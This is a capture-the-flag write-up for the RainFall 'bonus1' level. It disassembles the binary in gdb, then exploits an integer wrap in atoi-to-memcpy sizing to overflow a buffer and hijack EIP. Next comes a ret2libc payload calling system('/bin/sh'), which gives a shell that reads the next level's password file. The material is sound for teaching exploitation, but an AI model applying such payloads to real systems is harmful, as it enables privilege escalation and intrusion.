# Bonus1

First step - testing the program

	$ ./bonus1
	Segmentation fault (core dumped)
	$ ./bonus1 coucou
	$ ./bonus1 coucou coucou

The program segfault without parameters

Start in GDB

	(gdb)$ pdisas main
	Dump of assembler code for function main:
	   0x08048424 <+0>:		push   ebp
	   0x08048425 <+1>:		mov    ebp,esp
	   0x08048427 <+3>:		and    esp,0xfffffff0
	   0x0804842a <+6>:		sub    esp,0x40
	   0x0804842d <+9>:		mov    eax,DWORD PTR [ebp+0xc]
	   0x08048430 <+12>:	add    eax,0x4
	   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
	   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
	   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
	   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
	   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
	   0x08048446 <+34>:	jle    0x804844f <main+43>
	   0x08048448 <+36>:	mov    eax,0x1
	   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
	   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
	   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
	   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
	   0x0804845d <+57>:	add    eax,0x8
	   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
	   0x08048462 <+62>:	mov    edx,eax
	   0x08048464 <+64>:	lea    eax,[esp+0x14]
	   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
	   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
	   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
	   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
	   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
	   0x08048480 <+92>:	jne    0x804849e <main+122>
	   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
	   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
	   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
	   0x08048499 <+117>:	call   0x8048350 <execl@plt>
	   0x0804849e <+122>:	mov    eax,0x0
	   0x080484a3 <+127>:	leave
	   0x080484a4 <+128>:	ret
	End of assembler dump.

Lot of interesting things here

- memcpy call, we can overflow it
- a call to execl with parameters : execl("/bin/sh", "sh", 0)

Many conditions for continue the program :

First, atoi on the param and condition if the result is <= 9

But after, the param need to be equal to 0x574f4c46. We can't pass the condition for access the execl

We will exploit the memcpy for overflow and try a ret2libc wth "system" because there is the string "/bin/sh" in the program

Search how we can overwrite EIP

memcpy using an unsigned int (size_t) as parameter

	void *memcpy(void *dest, const void *src, size_t n)

We can put a negative number for pass the first condition but overflow the unsigned int and become positive when the "nb*4" is applied

	0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
	0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
	0x08048470 <+76>:	mov    DWORD PTR [esp],eax
	0x08048473 <+79>:	call   0x8048320 <memcpy@plt>

Put a breakpoint on main+79 for check the state of ECX, where is stored our input*4

UINT_MAX is 4294967295, / 4 is 1073741823

try with -1073741823


	(gdb) r -1073741823 coucou
	r -1073741823 coucou

	(gdb) p $ecx
	$1 = 4

ok, the result of input*4 is 4, so we passed 1... If we continue the program -> no segfault


let's add more than 10 (10*4) for overflow the buffer[40], -1073741823 - 20


	(gdb)$ r -1073741803 coucou
	Breakpoint 1, 0x08048473 in main ()

	(gdb)$ p $ecx
	$16 = 84

	(gdb-peda)$ c
	Continuing.

	Program received signal SIGSEGV, Segmentation fault.

We have the segfault, let's try with a pattern

	(gdb) r -1073741803 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
	Starting program: /home/user/bonus1/bonus1 -1073741803 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

	Program received signal SIGSEGV, Segmentation fault.
	0x4f4f4f4f in ?? ()

	(gdb) i r
	eax            0x0	0
	ecx            0x55555555	1431655765
	edx            0xbffff588	-1073744504
	ebx            0xb7fd0ff4	-1208152076
	esp            0xbffff570	0xbffff570
	ebp            0x4e4e4e4e	0x4e4e4e4e
	esi            0x0	0
	edi            0x0	0
	eip            0x4f4f4f4f	0x4f4f4f4f
	eflags         0x210287	[ CF PF SF IF RF ID ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51

EIP was overwritten by `0x4f4f4f4f` (OOOO). The offset start at 56


Now, for do a ret2libc attack, we need the system address, and the address of the string "/bin/sh"

	0x08048482 <+94>:	movl   $0x0,0x8(%esp)
	0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
	0x08048492 <+110>:	movl   $0x8048583,(%esp)
	0x08048499 <+117>:	call   0x8048350 <execl@plt>

	(gdb) x/s 0x8048583
	0x8048583:	 "/bin/sh"

The address of "/bin/sh" is "0x8048583"

	(gdb) r
	Starting program: /home/user/bonus1/bonus1

	Program received signal SIGSEGV, Segmentation fault.
	0xb7e601b0 in ?? () from /lib/i386-linux-gnu/libc.so.6

	(gdb) info function system
	All functions matching regular expression "system":

	Non-debugging symbols:
	0xb7e6b060  __libc_system
	0xb7e6b060  system
	0xb7f49550  svcerr_systemerr

The address of system is "0xb7e6b060"

Build the payload

	(B * 56) + "EIP = system address" + "RET = JUNK" + "/bin/sh address"

	bonus1@RainFall:~$ ./bonus1 -1073741803 $(python -c 'print "B"*56+"\x60\xb0\xe6\xb7"+"JUNK"+"\x83\x85\x04\x08"')
	$ whoami
	bonus2
	$ cat ~bonus2/.pass

Good!
